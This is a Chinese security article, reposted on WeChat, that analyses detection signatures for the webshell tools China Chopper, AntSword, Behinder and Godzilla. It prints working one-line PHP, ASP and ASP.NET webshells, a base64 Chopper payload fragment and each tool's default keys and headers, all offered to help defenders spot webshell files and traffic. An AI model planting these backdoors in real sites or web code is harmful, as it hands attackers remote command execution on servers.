#  分享 | 菜刀冰蝎蚁剑哥斯拉等webshell工具及特征分析

小帽子summer  [ 渗透Xiao白帽 ](javascript:void\(0\);)

**渗透Xiao白帽** ![]()

微信号 SuPejkj

功能介绍 积硅步以致千里，积怠惰以致深渊！

____

__

收录于话题

> 原文作者：小帽子summer  
>
> 原文地址：https://www.freebuf.com/articles/web/324622.html

## 前言

在工作中经常会遇到各种websehll，黑客通常要通过各种方式获取
webshell，从而获得企业网站的控制权，识别出webshell文件或通信流量可以有效地阻止黑客进一步的攻击行为，下面以常见的四款webshell进行分析，对工具连接流量有个基本认识。

## Webshell简介

webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，主要用于网站管理、服务器管理、权限管理等操作。使用方法简单，只需上传一个代码文件，通过网址访问，便可进行很多日常操作，极大地方便了使用者对网站和服务器的管理。正因如此，也有小部分人将代码修改后当作后门程序使用，以达到控制网站服务器的目的，也可以将其称做为一种网页后门

最普通的一句话木马：

  *   * 

    
    
    <?php   @eval($_POST['shell']);?><?php system($_REQUEST['cmd']);>

![](https://gitee.com/fuli009/images/raw/master/public/20220405173019.png)

## 中国菜刀

中国菜刀（Chopper）是一款经典的网站管理工具，具有文件管理、数据库管理、虚拟终端等功能。

它的流量特征十分明显，现如今的安全设备基本上都可以识别到菜刀的流量。现在的菜刀基本都是在安全教学中使用。

github项目地址：https://github.com/raddyfiy/caidao-official-version  

由于菜刀官方网站已关闭，现存的可能存在后门最好在虚拟机运行，上面项目已经进行了md5对比没有问题。

![](https://gitee.com/fuli009/images/raw/master/public/20220405173031.png)

### 菜刀webshell的静态特征

菜刀使用的webshell为一句话木马，特征十分明显

常见一句话(Eval)：

PHP, ASP, ASP.NET 的网站都可以：

> PHP:    <?php @eval($_POST['caidao']);?>
>
> ASP:    <%eval request("caidao")%>
>
> ASP.NET:    <%@ Page
> Language="Jscript"%><%eval(Request.Item["caidao"],"unsafe");%>

### 菜刀webshell的动态特征

请求包中：

ua头为百度爬虫

请求体中存在eavl，base64等特征字符

请求体中传递的payload为base64编码，并且存在固定的QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J

请求体中执行结果响应为明文，格式为X@Y    结果   X@Y之中

![](https://gitee.com/fuli009/images/raw/master/public/20220405173032.png)

![](https://gitee.com/fuli009/images/raw/master/public/20220405173033.png)

## 蚁剑

AntSword（蚁剑）是一个开放源代码，跨平台的网站管理工具，旨在满足渗透测试人员以及具有权限和/或授权的安全研究人员以及网站管理员的需求。

github项目地址：https://github.com/AntSwordProject/antSword  

![](https://gitee.com/fuli009/images/raw/master/public/20220405173034.png)

### 蚁剑webshell静态特征

https://github.com/AntSwordProject/AwesomeScript蚁剑官方为我们提供了制作好的后门，官方的脚本均做了不同程度“变异”，蚁剑的核心代码是由菜刀修改而来的，所有普通的一句话木马也可以使用。

Php中使用assert，eval执行, asp 使用eval
，在jsp使用的是Java类加载（ClassLoader）,同时会带有base64编码解码等字符特征

![]()

### 蚁剑webshell动态特征

默认编码连接时

这里我们直接使用菜刀的一句话webshell

每个请求体都存在@ini_set(“display_errors”, “0”);@set_time_limit(0)开头。并且存在base64等字符

响应包的结果返回格式为  随机数 结果  随机数

![](https://gitee.com/fuli009/images/raw/master/public/20220405173036.png)

使用base64编码器和解码器时

![]()

蚁剑会随机生成一个参数传入base64编码后的代码，密码参数的值是通过POST获取随机参数的值然后进行base64解码后使用eval执行

响应包的结果返回格式为  随机数 编码后的结果  随机数

![](https://gitee.com/fuli009/images/raw/master/public/20220405173037.png)

![](https://gitee.com/fuli009/images/raw/master/public/20220405173038.png)

## 冰蝎

冰蝎是一款动态二进制加密网站管理客户端。

github地址：https://github.com/rebeyond/Behinder

![](https://gitee.com/fuli009/images/raw/master/public/20220405173039.png)

冰蝎文件夹中，server 文件中存放了各种类型的木马文件

![]()

### 冰蝎webshell木马静态特征

这里主要分析3.0版本的

采用采用预共享密钥，密钥格式为md5(“admin”)[0:16], 所以在各种语言的webshell中都会存在16位数的连接密码，默认变量为k。

在PHP中会判断是否开启openssl采用不同的加密算法，在代码中同样会存在eval或assert等字符特征

![](https://gitee.com/fuli009/images/raw/master/public/20220405173040.png)

在aps中会在for循环进行一段异或处理

![](https://gitee.com/fuli009/images/raw/master/public/20220405173041.png)

在jsp中则利用java的反射，所以会存在ClassLoader，getClass().getClassLoader()等字符特征

![](https://gitee.com/fuli009/images/raw/master/public/20220405173042.png)

### 冰蝎2.0 webshell木马动态特征

在了解冰蝎3.0之前，先看看2.0是怎么交互等

2.0中采用协商密钥机制。第一阶段请求中返回包状态码为200，返回内容必定是16位的密钥

Accept: text/html, image/gif, image/jpeg, *; q=.2, */*;
q=.2![](https://gitee.com/fuli009/images/raw/master/public/20220405173043.png)

建立连接后 所有请求 Cookie的格式都为: Cookie: PHPSESSID=; path=/；

![]()

### 冰蝎3.0 webshell木马动态特征

在3.0中改了，去除了动态密钥协商机制，采用预共享密钥，全程无明文交互，密钥格式为md5(“admin”)[0:16],但还是会存在一些特征

在使用命令执行功能时，请求包中content-length 为5740或5720（可能会根据Java版本而改变）

每一个请求头中存在Pragma: no-cache，Cache-Control: no-cache

Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-
exchange;v=b3;q=0.9

![](https://gitee.com/fuli009/images/raw/master/public/20220405173044.png)

## 哥斯拉

哥斯拉继菜刀、蚁剑、冰蝎之后具有更多优点的Webshell管理工具

github地址：https://github.com/BeichenDream/Godzilla  

![](https://gitee.com/fuli009/images/raw/master/public/20220405173045.png)

哥斯拉的webshell需要动态生成，可以根据需求选择各种不同的加密方式

![]()

### 哥斯拉webshell木马静态特征

选择默认脚本编码生成的情况下，jsp会出现xc,pass字符和Java反射（ClassLoader，getClass().getClassLoader()），base64加解码等特征

![](https://gitee.com/fuli009/images/raw/master/public/20220405173046.png)

php，asp则为普通的一句话木马

![](https://gitee.com/fuli009/images/raw/master/public/20220405173047.png)

### 哥斯拉webshell动态特征

所有请求中Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

所有响应中Cache-Control: no-store, no-cache, must-revalidate,

以上两个只能作为弱特征参考

同时在所有请求中Cookie中后面都存在；特征

![](https://gitee.com/fuli009/images/raw/master/public/20220405173048.png)

## 不足

本文中只是分析了在php环境中的，并没有搭建其他语言环境进行分析，在之后会对各个语言的动态特征进行分析，同时尝试更多的混淆方式。

    
    
    【往期推荐】  
    
    
    [【内网渗透】内网信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485796&idx=1&sn=8e78cb0c7779307b1ae4bd1aac47c1f1&chksm=ea37f63edd407f2838e730cd958be213f995b7020ce1c5f96109216d52fa4c86780f3f34c194&scene=21#wechat_redirect)  
    
    
    [【内网渗透】域内信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485855&idx=1&sn=3730e1a1e851b299537db7f49050d483&chksm=ea37f6c5dd407fd353d848cbc5da09beee11bc41fb3482cc01d22cbc0bec7032a5e493a6bed7&scene=21#wechat_redirect)
    
    [【超详细 | Python】CS免杀-Shellcode Loader原理(python)](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486582&idx=1&sn=572fbe4a921366c009365c4a37f52836&chksm=ea37f32cdd407a3aea2d4c100fdc0a9941b78b3c5d6f46ba6f71e946f2c82b5118bf1829d2dc&scene=21#wechat_redirect)
    
    [【超详细 | Python】CS免杀-分离+混淆免杀思路](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486638&idx=1&sn=99ce07c365acec41b6c8da07692ffca9&chksm=ea37f3f4dd407ae28611d23b31c39ff1c8bc79762bfe2535f12d1b9d7a6991777b178a89b308&scene=21#wechat_redirect)  
    
    
    [【超详细 | 钟馗之眼】ZoomEye-python命令行的使用](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247488453&idx=1&sn=5828a0e1a2299d3ee0215f0ed4c30bf1&chksm=ea37ec9fdd406589124c67c45487be39ed1033d88c627092cf07f6d4f14ccdb9079b38dba74d&scene=21#wechat_redirect)  
    
    
    [【超详细 | 附EXP】Weblogic CVE-2021-2394 RCE漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247488922&idx=1&sn=f43e3c243bbbfd2822867a3acaa8b85e&chksm=ea37eac0dd4063d63d98f935c73ce571cbfeb0e7272a6f171a28143bdb3e7134b09ea874969a&scene=21#wechat_redirect)
    
    [【超详细】CVE-2020-14882 | Weblogic未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)
    
    [【超详细 | 附PoC】CVE-2021-2109 | Weblogic Server远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486517&idx=1&sn=34d494bd453a9472d2b2ebf42dc7e21b&chksm=ea37f36fdd407a7977b19d7fdd74acd44862517aac91dd51a28b8debe492d54f53b6bee07aa8&scene=21#wechat_redirect)
    
    [【漏洞分析 | 附EXP】CVE-2021-21985 VMware vCenter Server 远程代码执行漏洞](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247487906&idx=1&sn=e35998115108336f8b7c6679e16d1d0a&chksm=ea37eef8dd4067ee13470391ded0f1c8e269f01bcdee4273e9f57ca8924797447f72eb2656b2&scene=21#wechat_redirect)
    
    [【CNVD-2021-30167 | 附PoC】用友NC BeanShell远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247487897&idx=1&sn=6ab1eb2c83f164ff65084f8ba015ad60&chksm=ea37eec3dd4067d56adcb89a27478f7dbbb83b5077af14e108eca0c82168ae53ce4d1fbffabf&scene=21#wechat_redirect)  
    
    
    ## [【奇淫巧技】如何成为一个合格的“FOFA”工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)
    
    [【超详细】Microsoft Exchange 远程代码执行漏洞复现【CVE-2020-17144】](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485992&idx=1&sn=18741504243d11833aae7791f1acda25&chksm=ea37f572dd407c64894777bdf77e07bdfbb3ada0639ff3a19e9717e70f96b300ab437a8ed254&scene=21#wechat_redirect)
    
    [【超详细】Fastjson1.2.24反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)
    
    [  记一次HW实战笔记 | 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)
    
    [【漏洞速递+检测脚本 | CVE-2021-49104】泛微E-Office任意文件上传漏洞](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247491093&idx=1&sn=6eb98fb387c0df3a0488f43b2de5fb95&chksm=ea37e14fdd406859c3d72401523c1721d6e16b9aff320aed6f71602554b12be08d13e6cce666&scene=21#wechat_redirect)  
    
    
    [免杀基础教学（上卷）](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247490994&idx=1&sn=bb2486096d4cb848bebda423e96f9853&chksm=ea37e2e8dd406bfe612fe4cfbc7e70f9ce84119f3e9c7f72d38f276b6cb70157ca98f2936640&scene=21#wechat_redirect)  
    
    
    [免杀基础教学（下卷）](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247491023&idx=1&sn=2b15f46ecf305ef8cb4909c46a9e7e7c&chksm=ea37e295dd406b83b271710e15fd8767a59a81cd8b6b8f5f503123fa765fa6a9dc4ffa5ab0bd&scene=21#wechat_redirect)  
    
    
    走过路过的大佬们留个关注再走呗![]()
    
    往期文章有彩蛋哦![](https://gitee.com/fuli009/images/raw/master/public/20220405173049.png)

![](https://gitee.com/fuli009/images/raw/master/public/20220405173050.png)  

一如既往的学习，一如既往的整理，一如即往的分享![](https://gitee.com/fuli009/images/raw/master/public/20220405173051.png)  

“如侵权请私聊公众号删文”

 _ **推荐阅读↓↓↓**_

我知道你 **在看** 哟

  

  

预览时标签不可点

收录于话题 #

 个

上一篇 下一篇

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

